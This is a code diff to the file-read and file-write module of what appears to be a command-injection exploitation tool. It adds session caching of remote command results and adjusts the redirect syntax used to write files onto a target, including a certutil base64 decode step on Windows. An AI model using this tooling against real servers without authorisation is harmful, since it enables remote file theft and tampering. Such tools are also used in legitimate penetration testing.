@@ -21,6 +21,7 @@ import urllib2
 
 from src.utils import menu
 from src.utils import settings
+from src.utils import session_handler
 
 from src.thirdparty.colorama import Fore, Back, Style, init
 from src.core.injections.semiblind.techniques.file_based import fb_injector
@@ -40,8 +41,13 @@ def file_read(separator, payload, TAG, delay, prefix, suffix, http_request_metho
   else:
     cmd = settings.FILE_READ + file_to_read 
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
-  shell = "".join(str(p) for p in shell)
+  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
+    # Evaluate injection results.
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    shell = "".join(str(p) for p in shell)
+    session_handler.store_cmd(url, cmd, shell, vuln_parameter)
+  else:
+    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
   if menu.options.verbose:
     print ""
   if shell:
@@ -95,7 +101,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     # Find filename
     filname = os.path.basename(dest_to_write)
     tmp_filname = "tmp_" + filname
-    cmd = settings.FILE_WRITE + " " + content + " > " + tmp_filname + separator + settings.WIN_COMMENT
+    cmd = settings.FILE_WRITE + " " + content + ">" + tmp_filname + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     # Decode base 64 encoding
     cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + settings.WIN_COMMENT
@@ -110,7 +116,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, http_request_meth
     dest_to_write = path + "\\" + filname 
 
   else:
-    cmd = settings.FILE_WRITE + " '" + content + "'" + " > " + "'" + dest_to_write + "'"
+    cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
     shell = "".join(str(p) for p in shell)
@@ -193,8 +199,5 @@ def do_check(separator, payload, TAG, delay, prefix, suffix, http_request_method
   if menu.options.file_read:
     file_read(separator, payload, TAG, delay, prefix, suffix, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True 
-
-  if settings.FILE_ACCESS_DONE:
-    print ""
 
 # eof
